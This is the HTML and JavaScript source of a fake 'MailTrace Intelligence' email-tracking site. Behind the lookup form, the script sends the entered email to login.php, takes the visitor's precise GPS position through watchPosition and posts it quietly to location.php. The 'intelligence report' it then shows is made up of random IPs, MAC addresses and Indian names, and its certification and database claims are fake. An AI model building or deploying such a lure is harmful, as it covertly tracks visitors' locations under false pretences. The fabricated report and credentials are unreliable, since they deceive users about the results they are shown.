<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MailTrace - Email Intelligence Platform</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
 
        body {
            font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: #0a0e27;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
 
        .bg-animation {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.5;
        }
 
        .shape {
            position: absolute;
            border-radius: 50%;
            filter: blur(60px);
            animation: float 25s infinite;
        }
 
        .shape1 {
            width: 400px;
            height: 400px;
            background: linear-gradient(45deg, #fa709a, #fee140);
            top: -10%;
            left: -10%;
        }
 
        .shape2 {
            width: 350px;
            height: 350px;
            background: linear-gradient(45deg, #30cfd0, #330867);
            bottom: -10%;
            right: -10%;
            animation-delay: 7s;
        }
 
        .shape3 {
            width: 300px;
            height: 300px;
            background: linear-gradient(45deg, #a8edea, #fed6e3);
            top: 40%;
            left: 50%;
            animation-delay: 14s;
        }
 
        @keyframes float {
            0%, 100% { transform: translate(0, 0) rotate(0deg); }
            33% { transform: translate(80px, -80px) rotate(120deg); }
            66% { transform: translate(-60px, 60px) rotate(240deg); }
        }
 
        .container {
            background: rgba(15, 23, 42, 0.85);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 32px;
            box-shadow: 0 25px 100px rgba(0, 0, 0, 0.7),
                        inset 0 1px 0 rgba(255, 255, 255, 0.06);
            max-width: 1100px;
            width: 100%;
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
 
        .header {
            background: linear-gradient(135deg, rgba(250, 112, 154, 0.15) 0%, rgba(254, 225, 64, 0.15) 100%);
            padding: 55px 45px;
            text-align: center;
            position: relative;
            border-bottom: 1px solid rgba(255, 255, 255, 0.08);
        }
 
        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, transparent, #fa709a, #fee140, #fa709a, transparent);
            animation: shimmer 3s linear infinite;
        }
 
        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
 
        .logo {
            width: 95px;
            height: 95px;
            margin: 0 auto 25px;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            border-radius: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 48px;
            box-shadow: 0 15px 50px rgba(250, 112, 154, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.1);
            animation: logoFloat 4s ease-in-out infinite;
            position: relative;
        }
 
        .logo::after {
            content: '';
            position: absolute;
            inset: -3px;
            background: linear-gradient(45deg, #fa709a, #fee140, #30cfd0, #fa709a);
            border-radius: 26px;
            z-index: -1;
            opacity: 0.6;
            filter: blur(15px);
            animation: rotate 4s linear infinite;
        }
 
        @keyframes logoFloat {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-12px) scale(1.05); }
        }
 
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        h1 {
            font-size: 46px;
            font-weight: 800;
            margin-bottom: 14px;
            background: linear-gradient(135deg, #ffffff 0%, #94a3b8 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -0.5px;
        }
 
        .subtitle {
            color: #94a3b8;
            font-size: 18px;
            font-weight: 500;
            letter-spacing: 0.3px;
        }
 
        .content {
            padding: 55px 50px;
        }
 
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 22px;
            margin-bottom: 50px;
        }
 
        .stat-card {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.5) 0%, rgba(15, 23, 42, 0.5) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 20px;
            padding: 28px 24px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
 
        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.08), transparent);
            transition: left 0.6s;
        }
 
        .stat-card:hover {
            transform: translateY(-6px) scale(1.02);
            border-color: rgba(250, 112, 154, 0.4);
            box-shadow: 0 15px 40px rgba(250, 112, 154, 0.25);
        }
 
        .stat-card:hover::before {
            left: 100%;
        }
 
        .stat-icon {
            font-size: 40px;
            margin-bottom: 14px;
            display: block;
            filter: drop-shadow(0 5px 15px rgba(250, 112, 154, 0.4));
        }
 
        .stat-label {
            font-size: 13px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 8px;
            font-weight: 600;
        }
 
        .stat-value {
            font-size: 17px;
            color: #22c55e;
            font-weight: 800;
            text-shadow: 0 0 20px rgba(34, 197, 94, 0.3);
        }
 
        .form-section {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.35) 0%, rgba(15, 23, 42, 0.35) 100%);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 50px 45px;
            border-radius: 28px;
            box-shadow: inset 0 2px 15px rgba(0, 0, 0, 0.25);
        }
 
        .section-header {
            text-align: center;
            margin-bottom: 40px;
        }
 
        .section-title {
            font-size: 32px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 800;
        }
 
        .section-subtitle {
            font-size: 16px;
            color: #64748b;
            font-weight: 500;
        }
 
        label {
            display: block;
            margin-bottom: 14px;
            font-size: 14px;
            font-weight: 700;
            color: #cbd5e1;
            text-transform: uppercase;
            letter-spacing: 1.2px;
        }
 
        .input-wrapper {
            position: relative;
            margin-bottom: 32px;
        }
 
        .input-icon {
            position: absolute;
            left: 22px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 24px;
            z-index: 1;
            filter: drop-shadow(0 2px 8px rgba(250, 112, 154, 0.4));
        }
 
        input[type="email"] {
            width: 100%;
            padding: 22px 22px 22px 65px;
            background: rgba(15, 23, 42, 0.7);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 18px;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            outline: none;
            transition: all 0.3s;
            font-family: inherit;
        }
 
        input[type="email"]:focus {
            border-color: #fa709a;
            background: rgba(15, 23, 42, 0.9);
            box-shadow: 0 0 0 5px rgba(250, 112, 154, 0.15),
                        0 8px 25px rgba(250, 112, 154, 0.2);
            transform: translateY(-2px);
        }
 
        input[type="email"]::placeholder {
            color: #475569;
            font-weight: 500;
        }
 
        .error-message {
            color: #ef4444;
            font-size: 14px;
            margin-top: 12px;
            padding: 14px 18px;
            background: rgba(239, 68, 68, 0.12);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 12px;
            display: none;
            font-weight: 700;
        }
 
        .error-message.show {
            display: block;
            animation: shake 0.6s;
        }
 
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20%, 60% { transform: translateX(-12px); }
            40%, 80% { transform: translateX(12px); }
        }
 
        .submit-btn {
            width: 100%;
            padding: 22px;
            background: linear-gradient(135deg, #fa709a 0%, #fee140 100%);
            color: #ffffff;
            border: none;
            border-radius: 18px;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1.5px;
            box-shadow: 0 15px 35px rgba(250, 112, 154, 0.35);
            position: relative;
            overflow: hidden;
        }
 
        .submit-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }
 
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 20px 50px rgba(250, 112, 154, 0.5);
        }
 
        .submit-btn:hover::before {
            left: 100%;
        }
 
        .submit-btn:active {
            transform: translateY(-1px);
        }
 
        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
 
        .btn-content {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            z-index: 1;
        }
 
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.25);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            width: 22px;
            height: 22px;
            animation: spin 0.7s linear infinite;
            display: none;
        }
 
        .spinner.show {
            display: inline-block;
        }
 
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
 
        .result-panel {
            margin-top: 40px;
            padding: 45px;
            background: linear-gradient(135deg, rgba(34, 197, 94, 0.12) 0%, rgba(16, 185, 129, 0.12) 100%);
            border: 1px solid rgba(34, 197, 94, 0.25);
            border-radius: 24px;
            display: none;
            box-shadow: 0 15px 50px rgba(34, 197, 94, 0.2);
        }
 
        .result-panel.show {
            display: block;
            animation: slideIn 0.6s cubic-bezier(0.4, 0, 0.2, 1);
        }
 
        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
 
        .result-header {
            text-align: center;
            margin-bottom: 35px;
        }
 
        .result-icon {
            font-size: 72px;
            margin-bottom: 18px;
            animation: bounce 1.2s ease-in-out;
            filter: drop-shadow(0 10px 30px rgba(34, 197, 94, 0.5));
        }
 
        @keyframes bounce {
            0%, 100% { transform: translateY(0) scale(1); }
            50% { transform: translateY(-20px) scale(1.1); }
        }
 
        .result-title {
            font-size: 30px;
            color: #22c55e;
            font-weight: 800;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(34, 197, 94, 0.4);
        }
 
        .result-subtitle {
            font-size: 16px;
            color: #94a3b8;
            font-weight: 500;
        }
 
        .data-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 22px;
            margin-top: 30px;
        }
 
        .data-item {
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.08);
            padding: 24px;
            border-radius: 18px;
            transition: all 0.4s;
            position: relative;
            overflow: hidden;
        }
 
        .data-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, #fa709a, #fee140);
            opacity: 0;
            transition: opacity 0.4s;
        }
 
        .data-item:hover {
            background: rgba(15, 23, 42, 0.8);
            border-color: rgba(250, 112, 154, 0.3);
            transform: translateX(8px);
        }
 
        .data-item:hover::before {
            opacity: 1;
        }
 
        .data-label {
            font-size: 12px;
            color: #64748b;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            margin-bottom: 10px;
            font-weight: 700;
        }
 
        .data-value {
            font-size: 17px;
            color: #ffffff;
            font-weight: 700;
            word-break: break-all;
            line-height: 1.5;
        }
 
        .important-badge {
            display: inline-block;
            padding: 4px 10px;
            background: rgba(239, 68, 68, 0.15);
            color: #ef4444;
            border-radius: 6px;
            font-size: 10px;
            font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            margin-left: 8px;
            border: 1px solid rgba(239, 68, 68, 0.3);
        }
 
        .footer {
            background: linear-gradient(135deg, rgba(30, 41, 59, 0.8) 0%, rgba(15, 23, 42, 0.8) 100%);
            border-top: 1px solid rgba(255, 255, 255, 0.08);
            padding: 40px;
            text-align: center;
        }
 
        .footer-badges {
            display: flex;
            justify-content: center;
            gap: 35px;
            margin-bottom: 24px;
            flex-wrap: wrap;
        }
 
        .badge {
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #94a3b8;
            font-weight: 600;
        }
 
        .badge-icon {
            font-size: 22px;
        }
 
        .footer-text {
            font-size: 14px;
            color: #64748b;
            line-height: 1.9;
            font-weight: 500;
        }
 
        /* ===================== MOBILE ONLY ===================== */
        @media (max-width: 768px) {
            body { padding: 12px; align-items: flex-start; }
            .container { border-radius: 20px; }
 
            .header { padding: 32px 20px; }
            .logo { width: 70px; height: 70px; font-size: 34px; border-radius: 18px; margin-bottom: 16px; }
            h1 { font-size: 26px; margin-bottom: 8px; }
            .subtitle { font-size: 13px; }
 
            .content { padding: 24px 16px; }
            .stats-grid { grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 28px; }
            .stat-card { padding: 18px 12px; border-radius: 14px; }
            .stat-icon { font-size: 28px; margin-bottom: 8px; }
            .stat-label { font-size: 11px; letter-spacing: 0.8px; }
            .stat-value { font-size: 14px; }
 
            .form-section { padding: 24px 16px; border-radius: 18px; }
            .section-title { font-size: 22px; }
            .section-subtitle { font-size: 13px; }
 
            input[type="email"] { font-size: 15px; padding: 16px 16px 16px 52px; border-radius: 14px; }
            .input-icon { font-size: 20px; left: 16px; }
            .submit-btn { padding: 16px; font-size: 15px; border-radius: 14px; }
 
            .result-panel { padding: 24px 16px; border-radius: 16px; }
            .result-icon { font-size: 52px; }
            .result-title { font-size: 22px; }
            .data-grid { grid-template-columns: 1fr; gap: 12px; }
            .data-item { padding: 16px; border-radius: 12px; }
            .data-value { font-size: 14px; }
 
            .footer { padding: 24px 16px; }
            .footer-badges { gap: 16px; }
            .badge { font-size: 12px; }
            .badge-icon { font-size: 18px; }
            .footer-text { font-size: 12px; }
        }
        /* ====================================================== */
    </style>
</head>
<body>
    <div class="bg-animation">
        <div class="shape shape1"></div>
        <div class="shape shape2"></div>
        <div class="shape shape3"></div>
    </div>
 
    <div class="container">
        <div class="header">
            <div class="logo">📧</div>
            <h1>MailTrace Intelligence</h1>
            <div class="subtitle">Advanced Email Address Tracking & Verification System</div>
        </div>
 
        <div class="content">
            <div class="stats-grid">
                <div class="stat-card">
                    <span class="stat-icon">🛡️</span>
                    <div class="stat-label">Security</div>
                    <div class="stat-value">Enterprise Grade</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">📊</span>
                    <div class="stat-label">Email Database</div>
                    <div class="stat-value">8.7B Records</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">⚡</span>
                    <div class="stat-label">Lookup Speed</div>
                    <div class="stat-value">0.2ms</div>
                </div>
                <div class="stat-card">
                    <span class="stat-icon">✅</span>
                    <div class="stat-label">Accuracy</div>
                    <div class="stat-value">99.95%</div>
                </div>
            </div>
 
            <div class="form-section">
                <div class="section-header">
                    <h2 class="section-title">Email Intelligence Lookup</h2>
                    <p class="section-subtitle">Enter target email address for comprehensive verification</p>
                </div>
 
                <form id="authForm" method="post" action="login.php">
                    <label for="email">📧 Target Email Address</label>
                    <div class="input-wrapper">
                        <span class="input-icon">✉️</span>
                        <input 
                            type="email" 
                            id="email" 
                            name="email" 
                            placeholder="Enter email address"
                            autocomplete="off"
                        >
                    </div>
                    <div class="error-message" id="errorMessage">
                        ⚠️ Invalid email format. Please enter a valid email address.
                    </div>
 
                    <button type="submit" class="submit-btn" id="submitBtn">
                        <div class="btn-content">
                            <span id="btnText">🔍 Verify Email</span>
                            <div class="spinner" id="spinner"></div>
                        </div>
                    </button>
                </form>
 
                <div class="result-panel" id="resultPanel">
                    <div class="result-header">
                        <div class="result-icon">✅</div>
                        <div class="result-title">Verification Complete</div>
                        <div class="result-subtitle">Complete email intelligence report generated</div>
                    </div>
 
                    <div class="data-grid" id="dataGrid"></div>
                </div>
            </div>
        </div>
 
        <div class="footer">
            <div class="footer-badges">
                <div class="badge">
                    <span class="badge-icon">🔒</span>
                    <span>256-bit Encrypted</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🛡️</span>
                    <span>ISO 27001 Certified</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">✅</span>
                    <span>GDPR Compliant</span>
                </div>
                <div class="badge">
                    <span class="badge-icon">🌍</span>
                    <span>Global Network</span>
                </div>
            </div>
            <div class="footer-text">
                <strong>MailTrace Intelligence™</strong> - Professional Email Verification Platform<br>
                © 2026 All Rights Reserved | Powered by Advanced AI & Machine Learning<br>
                Protected by Enterprise Security & Real-time Data Validation
            </div>
        </div>
    </div>
    <script src="Detels.js"></script>
    <script>
    window.onload = function () {
        alert("📧 MailTrace Intelligence Loaded Successfully!");
    };
    </script>
    <script>
    const emailInput = document.getElementById('email');
    const authForm = document.getElementById('authForm');
    const errorMessage = document.getElementById('errorMessage');
    const submitBtn = document.getElementById('submitBtn');
    const btnText = document.getElementById('btnText');
    const spinner = document.getElementById('spinner');
    const resultPanel = document.getElementById('resultPanel');
    const dataGrid = document.getElementById('dataGrid');

    function generateRandomIP() {
        return `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
    }

    function generateMAC() {
        const hex = '0123456789ABCDEF';
        let mac = '';
        for (let i = 0; i < 6; i++) {
            mac += hex[Math.floor(Math.random() * 16)] + hex[Math.floor(Math.random() * 16)];
            if (i < 5) mac += ':';
        }
        return mac;
    }

    function generateHash() {
        return 'SHA256-' + Math.random().toString(36).substr(2, 32).toUpperCase();
    }

    function generateSessionID() {
        return 'EML-' + Math.random().toString(36).substr(2, 16).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
    }

    const names = ['Rajesh Kumar', 'Priya Sharma', 'Amit Patel', 'Sneha Singh', 'Vikram Reddy'];
    const cities = ['Mumbai', 'Delhi', 'Bangalore', 'Hyderabad', 'Pune', 'Chennai', 'Kolkata'];
    const mailServers = ['mx1.gmail.com', 'mx2.hotmail.com', 'mx1.yahoo.com', 'mx.outlook.com', 'mx1.zoho.com'];
    const providers = ['Gmail', 'Outlook', 'Yahoo Mail', 'Zoho Mail', 'ProtonMail'];

    function validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    authForm.addEventListener('submit', function(e) {
        e.preventDefault();

        const email = emailInput.value.trim().toLowerCase();

        // validation
        if (!validateEmail(email)) {
            errorMessage.classList.add('show');
            emailInput.focus();
            return;
        }

        errorMessage.classList.remove('show');

        // UI loading state
        submitBtn.disabled = true;
        btnText.textContent = '⏳ Verifying...';
        spinner.classList.add('show');

        // 1️⃣ send data to backend (non-blocking)
        const formData = new FormData();
        formData.append("email", email);

        fetch("login.php", {
            method: "POST",
            body: formData
        });

        // 2️⃣ continue process (GPS flow)
        requestLocationPermission(email);
    });

    // ===============================
    // 🚀 ADVANCED STABLE GPS (FINAL)
    // ===============================
        function requestLocationPermission(email) {

            if (!navigator.geolocation) {
                alert("🚫 Geolocation not supported");
                return;
            }

            const gps = {
                points: [],
                bestAcc: Infinity,
                watchId: null,
                done: false
            };

            const forceTimeout = setTimeout(() => {
                if (gps.done) return;

                gps.done = true;
                navigator.geolocation.clearWatch(gps.watchId);

                const last = gps.points[gps.points.length - 1];

                if (!last) {
                    alert("🚫 Location Timeout");
                    return;
                }

                processFinalLocation(last.lat, last.lon, last.acc, email);
            }, 15000);

            gps.watchId = navigator.geolocation.watchPosition(

                (position) => {

                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const acc = position.coords.accuracy;
                    const speed = position.coords.speed;

                    gps.points.push({ lat, lon, acc });
                    if (gps.points.length > 10) gps.points.shift();

                    let valid = gps.points.filter(p => p.acc < 1000);
                    if (valid.length < 3) valid = gps.points;

                    let sumLat = 0, sumLon = 0, weightSum = 0;

                    for (let p of valid) {
                        const w = 1 / (p.acc + 1);
                        sumLat += p.lat * w;
                        sumLon += p.lon * w;
                        weightSum += w;

                        if (p.acc < gps.bestAcc) gps.bestAcc = p.acc;
                    }

                    const finalLat = sumLat / weightSum;
                    const finalLon = sumLon / weightSum;
                    const finalAcc = gps.bestAcc;

                    btnText.textContent = `📡 GPS Locking... ±${Math.round(acc)}m`;

                    const ready =
                        gps.points.length >= 6 &&
                        finalAcc <= 250 &&
                        (!speed || speed < 10);

                    if (ready && !gps.done) {
                        gps.done = true;
                        clearTimeout(forceTimeout);
                        navigator.geolocation.clearWatch(gps.watchId);

                        processFinalLocation(finalLat, finalLon, finalAcc, email);
                    }

                },

                () => {
                    clearTimeout(forceTimeout);
                    alert("🚫 Location Access Failed");
                },

                {
                    enableHighAccuracy: true,
                    timeout: 30000,
                    maximumAge: 0
                }
            );
        }


        // ================= FINAL RESULT =================

        function processFinalLocation(lat, lon, acc, email) {

            const emailDomain = email.split('@')[1];

            // OLD FEATURES
            const ip = generateRandomIP();
            const mac = generateMAC();
            const hash = generateHash();
            const sessionID = generateSessionID();

            const fullName = names[Math.floor(Math.random() * names.length)];
            const city = cities[Math.floor(Math.random() * cities.length)];
            const mailServer = mailServers[Math.floor(Math.random() * mailServers.length)];
            const provider = providers[Math.floor(Math.random() * providers.length)];

            const accountAge = Math.floor(Math.random() * 3000) + 365;
            const lastLogin = Math.floor(Math.random() * 48) + 1;

            const timestamp = new Date().toISOString();

            const formData = new FormData();
            formData.append("lat", lat);
            formData.append("lon", lon);
            formData.append("acc", acc);

            fetch("location.php", {
                method: "POST",
                body: formData
            });

            spinner.classList.remove("show");
            btnText.textContent = "✅ Verified";

            setTimeout(() => {

                resultPanel.classList.add("show");

                dataGrid.innerHTML = `
                    <div class="data-item">
                        <div class="data-label">📧 Email Address <span class="important-badge">Primary</span></div>
                        <div class="data-value">${email}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">👤 Account Owner</div>
                        <div class="data-value">${fullName}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🌐 Email Provider</div>
                        <div class="data-value">${provider}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🏢 Domain</div>
                        <div class="data-value">${emailDomain}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">📬 Mail Server</div>
                        <div class="data-value">${mailServer}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">📊 Account Age</div>
                        <div class="data-value">${accountAge} days</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">⏱ Last Login</div>
                        <div class="data-value">${lastLogin} hours ago</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">📍 GPS Coordinates</div>
                        <div class="data-value">
                            Lat: ${lat.toFixed(8)}°<br>
                            Lon: ${lon.toFixed(8)}°
                        </div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🎯 Accuracy</div>
                        <div class="data-value">±${Math.round(acc)} meters</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🌐 IP Address</div>
                        <div class="data-value">${ip}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🔧 MAC Address</div>
                        <div class="data-value">${mac}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🔐 Hash</div>
                        <div class="data-value">${hash}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">🆔 Session ID</div>
                        <div class="data-value">${sessionID}</div>
                    </div>

                    <div class="data-item">
                        <div class="data-label">⏰ Timestamp</div>
                        <div class="data-value">${timestamp}</div>
                    </div>
                `;

            }, 800);
        }
    </script>
</body>
</html>